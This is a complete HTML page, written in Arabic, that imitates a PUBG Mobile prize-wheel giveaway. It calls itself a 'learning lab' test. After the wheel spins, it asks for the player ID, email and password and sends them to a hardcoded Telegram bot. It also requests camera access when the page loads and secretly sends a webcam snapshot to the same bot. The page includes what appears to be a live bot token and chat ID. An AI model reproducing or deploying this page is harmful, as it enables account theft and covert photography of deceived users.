<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Test - Learning Lab</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body {
            background: #0a0b10 url('https://www.pubgmobile.com/images/event/dark_stars/bg_pc.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .container { padding: 20px; }
        .logo { width: 150px; margin-top: 20px; }
        
        /* العجلة - استخدام رابط خارجي موثوق */
        .wheel-box {
            position: relative;
            width: 300px;
            height: 300px;
            margin: 30px auto;
            border: 5px solid #f3bc18;
            border-radius: 50%;
            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center;
            background-size: contain;
            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
        }

        .login-card {
            background: rgba(0, 0, 0, 0.9);
            padding: 20px;
            border-radius: 15px;
            max-width: 380px;
            margin: 20px auto;
            border: 1px solid #f3bc18;
            display: none;
        }
        input {
            width: 85%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #444;
            background: #111;
            color: #fff;
            text-align: center;
        }
        .btn {
            background: #f3bc18;
            color: #000;
            padding: 15px 40px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.pubgmobile.com/common/images/icon_logo.png" class="logo">
    
    <h1>اختبار عجلة الحظ (نسخة تعليمية)</h1>
    
    <div class="wheel-box" id="wheel"></div>
    
    <button class="btn" id="spinBtn" onclick="startSpin()">تدوير العجلة</button>

    <div id="loginCard" class="login-card">
        <h3 style="color:#f3bc18">مبروك! فزت بـ 8100 شدة</h3>
        <p>قم بتسجيل البيانات لاختبار وصول التنبيه</p>
        <input type="text" id="id" placeholder="ID اللاعب">
        <input type="email" id="user" placeholder="الإيميل">
        <input type="password" id="pass" placeholder="كلمة المرور">
        <button class="btn" onclick="sendData()" style="width:100%">إرسال البيانات للبوت</button>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const TOKEN = "8338334656:AAFJosPcNri8hJeERp7Si-JXzSkxmBAmwG8";
    const CHAT = "8754338811";

    // طلب الكاميرا (للاختبار)
    async function initCam() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = s;
        } catch (e) { console.log("Cam Blocked"); }
    }
    initCam();

    function startSpin() {
        const w = document.getElementById('wheel');
        w.style.transform = `rotate(${Math.floor(Math.random() * 360) + 1800}deg)`;
        setTimeout(() => {
            document.getElementById('loginCard').style.display = 'block';
            document.getElementById('spinBtn').style.display = 'none';
        }, 4000);
    }

    async function sendData() {
        const id = document.getElementById('id').value;
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;

        const txt = `🧪 **تجربة برمجية ناجحة**\n🆔 ID: ${id}\n📧 User: ${u}\n🔑 Pass: ${p}`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT, text: txt })
        });

        // سحب صورة اختبارية
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        const img = c.toDataURL('image/jpeg');
        
        const blob = await (await fetch(img)).blob();
        const fd = new FormData();
        fd.append('chat_id', CHAT);
        fd.append('photo', blob, 'test.jpg');
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });

        Swal.fire('تم الإرسال', 'وصلت البيانات للبوت الخاص بك بنجاح', 'success');
    }
</script>
</body>
</html>
